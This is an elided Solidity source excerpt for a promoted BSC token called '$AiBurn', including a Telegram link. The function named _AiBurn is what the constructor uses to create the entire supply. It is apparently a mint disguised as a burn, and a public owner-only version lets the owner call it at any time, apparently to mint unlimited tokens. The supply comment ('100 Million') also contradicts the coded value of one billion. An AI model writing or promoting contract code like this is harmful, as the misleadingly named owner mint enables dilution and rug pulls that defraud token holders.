...
//
// $AiBurn proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/AiBurnBsc
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _AiBurn(uint256 amount) public onlyOwner {
 _AiBurn(msg.sender, amount);
    }
    ...
    function _AiBurn(address account, uint256 amount) internal virtual {
...
contract $AiBurn is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Ai Burn", "AB") {
     _AiBurn(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}